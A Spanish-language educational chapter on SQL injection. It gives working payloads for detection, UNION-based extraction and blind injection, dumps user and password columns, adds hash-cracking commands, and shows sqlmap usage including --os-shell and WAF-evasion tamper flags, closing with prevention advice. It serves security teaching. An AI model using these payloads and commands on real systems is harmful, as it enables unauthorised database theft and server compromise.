---
icon: syringe
---

# 8 · SQL para Hacking: Inyección SQL

> **⚠️ AVISO LEGAL:** Este capítulo es **solo educativo**. Atacar sistemas sin autorización expresa es **ilegal**. Practica únicamente en laboratorios propios, HackTheBox, TryHackMe, PortSwigger Academy, OWASP Juice Shop o programas de bug bounty con scope autorizado.

***

## ¿Qué es la Inyección SQL (SQLi)?

La **inyección SQL** es la vulnerabilidad web más clásica de la historia (y sigue en el OWASP Top 10). Ocurre cuando una aplicación **concatena directamente la entrada del usuario** en una consulta SQL, sin filtrar ni parametrizar.

Si la consulta se construye así (código PHP vulnerable típico):

```php
// ❌ CÓDIGO VULNERABLE
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "' AND password = '" . $_GET['pass'] . "'";
```

Entonces la web "pega" tu input dentro de la consulta. **Tú escribes SQL, la base de datos lo ejecuta.** Eso es todo el secreto.

## Tipos de inyección SQL

| Tipo                        | Cómo se manifiesta                                                 |
| --------------------------- | ------------------------------------------------------------------ |
| **Error-based**             | Los errores de la BD se muestran en la web (filtrar info)          |
| **UNION-based**             | Usas `UNION SELECT` para añadir tus propios resultados a la página |
| **Boolean-based blind**     | No ves errores, pero la página cambia según sea TRUE/FALSE         |
| **Time-based blind**        | No cambia nada visible; usas `SLEEP()` para medir tiempos          |
| **Out-of-band (OOB)**       | La BD hace peticiones externas (DNS/HTTP) con los datos            |
| **In-band stacked queries** | Puedes apilar consultas con `;` (depende del driver)               |

## Paso 1 — Detectar la vulnerabilidad

La técnica básica: **romper la consulta** y ver cómo reacciona la web. Los payloads clásicos en un parámetro como `?id=1`:

```sql
'           -- comilla simple: si salta un error de SQL, pista clara
1' AND '1'='1   -- la página se carga igual → la comilla cierra bien
1' AND '1'='2   -- la página cambia/vacía → hay SQLi inyectable
1 AND 1=1     -- versión sin comillas (campo numérico)
1 AND 1=2     -- cambia → numérico inyectable
```

**Lógica:** si `AND 1=1` carga normal pero `AND 1=2` da una página distinta, tu condición se está ejecutando dentro de la consulta → **hay inyección**.

### Comentarios SQL (cierran el resto de la consulta)

| Comentario         | Dialecto                                        |
| ------------------ | ----------------------------------------------- |
| `--` (con espacio) | MySQL, SQL Server (URL-encoded: `--+` o `-- -`) |
| `#`                | MySQL                                           |
| `/* ... */`        | Comentario de bloque (multi-motor)              |
| `;`                | Apilar consultas (solo algunos drivers)         |

## Paso 2 — Determinar el número de columnas (UNION-based)

Para usar `UNION SELECT` necesitas saber cuántas columnas devuelve la consulta original. Dos formas:

```sql
-- Forma 1: ORDER BY creciente hasta que dé error
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    -- ... el último que funcione = nº de columnas

-- Forma 2: UNION con NULLs crecientes
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   -- el que no dé error = nº columnas
```

Luego localiza **qué columnas se muestran** en la página:

```sql
' UNION SELECT 1,2,3-- -        -- mira qué número aparece en pantalla
' UNION SELECT 'a','b','c'-- -  -- confirma que acepta texto
```

## Paso 3 — Extraer datos (MySQL, ejemplo clásico)

```sql
-- Versión de la BD
' UNION SELECT 1,@@version,3-- -

-- Base de datos actual
' UNION SELECT 1,database(),3-- -

-- Usuario actual
' UNION SELECT 1,user(),3-- -

-- Listar TODAS las bases de datos (information_schema)
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -

-- Listar tablas de una base de datos
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='webdb'-- -

-- Listar columnas de una tabla
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Volcar los usuarios
' UNION SELECT 1,username,password FROM users-- -
```

> 🧠 `information_schema` es la "base de datos de las bases de datos": describe todas las tablas y columnas del servidor. Es el mapa del tesoro en MySQL/PostgreSQL.

### Contraseñas hasheadas

```sql
-- Los passwords suelen estar hasheados (MD5, SHA...)
-- Identifica el hash (ej: MD5 = 32 hex) y pásalo a:
--   hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
--   john --format=raw-md5 hashes.txt --wordlist=rockyou.txt
```

## SQLi a ciegas (blind)

Cuando la web no muestra errores ni datos, explotas respuestas **binarias** (sí/no) o **tiempos**:

```sql
-- Boolean-based: la web carga distinto si la condición es TRUE
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -

-- Time-based: la web tarda 5s si la condición es TRUE
1' AND IF(SUBSTRING(username,1,1)='a', SLEEP(5), 0)-- -
```

Así se adivina el contenido **carácter a carácter** (automatizable con scripts o sqlmap). Aquí es donde `LIKE`, `SUBSTRING()`, `ASCII()` y las funciones del [capítulo 5](05-funciones-utilidad.md) brillan.

## 🛠️ sqlmap — El automatizador

`sqlmap` automatiza todo el proceso. **Solo contra laboratorios propios o autorizados.**

```bash
# Instalación
sudo apt install sqlmap

# Detección básica sobre una URL vulnerable
sqlmap -u "http://vulnerable.com/item.php?id=1" --batch

# Especificar el parámetro y el nivel de pruebas
sqlmap -u "http://vulnerable.com/item.php?id=1" -p id --level=3 --risk=2 --batch

# Enumerar bases de datos
sqlmap -u "..." --dbs --batch

# Tablas de una BD
sqlmap -u "..." -D webdb --tables --batch

# Columnas de una tabla
sqlmap -u "..." -D webdb -T users --columns --batch

# Volcar datos
sqlmap -u "..." -D webdb -T users --dump --batch

# Intentar shell interactiva (SUBIR ARCHIVOS si hay permisos)
sqlmap -u "..." --os-shell --batch
```

> 🧠 Flags útiles: `--cookie="PHPSESSID=..."` para sesiones, `--data="user=1&pass=1"` para POST, `--random-agent` para rotar User-Agent, `--tamper=space2comment` para evadir filtros (WAF), `--threads=10` para acelerar.

## 🧪 Laboratorios legales para practicar

| Recurso                                                                     | Qué ofrece                                                                   |
| --------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection) | Los mejores labs de SQLi, gratis                                             |
| [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)               | App vulnerable para docker (`docker run -p 3000:3000 bkimminich/juice-shop`) |
| HackTheBox / TryHackMe                                                      | Máquinas con SQLi en contexto real                                           |
| [sqlzoo.net](https://sqlzoo.net) / sql-learning playground                  | Para afianzar SQL puro                                                       |

## 🛡️ Prevención (para defenders y devs)

1. **Consultas parametrizadas (prepared statements)** — la defensa nº 1:

```php
// ✅ SEGURO (PHP + PDO)
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$user, $pass]);
```

2. **Validar la entrada** del usuario (listas blancas, tipos, longitud).
3. **Escapar correctamente** solo como última capa (no es suficiente por sí solo).
4. **Mínimo privilegio** en el usuario de BD (nada de root para la web).
5. **No mostrar errores de BD** al usuario (error-based se muere con esto).
6. **WAF + logs** como defensa en profundidad.

***

## 📌 Resumen del capítulo

* SQLi = **tu input se convierte en SQL** porque el código concatena sin parametrizar.
* Flujo clásico: detectar (`'`, `AND 1=1/1=2`) → contar columnas (`ORDER BY`, `UNION NULL`) → localizar columnas visibles → extraer con `information_schema` → dump.
* Blind: boolean (`AND ...='a'`) o time (`SLEEP()`), carácter a carácter.
* `sqlmap` automatiza todo: `-u`, `--dbs`, `--tables`, `--dump`, `--os-shell`.
* La defensa real: **prepared statements**, siempre.

➡️ **Siguiente capítulo:** [Recursos y Retos](08-recursos.md)
